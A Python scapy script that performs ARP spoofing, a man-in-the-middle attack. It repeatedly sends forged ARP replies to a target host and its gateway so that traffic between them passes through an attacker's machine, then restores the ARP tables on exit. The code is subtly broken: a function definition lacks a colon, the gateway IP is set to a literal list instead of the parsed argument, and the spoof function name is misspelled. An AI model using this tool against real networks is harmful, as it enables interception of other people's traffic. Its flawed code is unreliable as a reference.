from scapy.all import *
import time
import argparse
# Remember to enable IP forwarding on your attacking machine.
# sudo sysctl -w net.ipv4.ip_forward=1


def get_mac(ip):
    ans, _ = arping(ip)
    for snt, recv in ans:
        mac = recv[Ether].src
        return mac


def apr_spoof(ip_to_spoof, pretend_ip):
    arp_response = ARP()
    #print(arp_response.show())
    # Set the ARP to be an ARP response
    arp_response.op = 2
    # Victim IP
    arp_response.pdst = ip_to_spoof
    # Victim MAC
    arp_response.hwdst = get_mac(ip_to_spoof)
    # MAC of attacker
    arp_response.hwsrc = "00:0c:29:9b:e8:09"
    # IP address of the router we are pretending to be
    arp_response.psrc = pretend_ip
    # print(arp_response.show())
    send(arp_response)


def restore_arp_table(dst, src)
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = dst
    arp_response.hwdst = get_mac(dst)
    arp_response.hwsrc = get_mac(src)
    arp_response.psrc = src
    send(arp_response, count=10)


def parse_user_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Provide the target IP", required=True)
    parser.add_argument("-g", "--gateway", help="Provide the gateway router IP", required=True)
    args = vars(parser.parse_args())
    return args


if __name__ == "__main__":
    args = parse_user_arguments()
    victim_ip = args['target']
    gateway_ip = ['gateway']
    try:
        while True:
            # Fool victim to think we are the router
            apr_spoof(victim_ip,gateway_ip)
            # Fool router to think we are the victim
            apr_spoof(gateway_ip, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] Exiting and restoring ARP tables")
        restore_arp_table(victim_ip, gateway_ip)
        restore_arp_table(gateway_ip, victim_ip)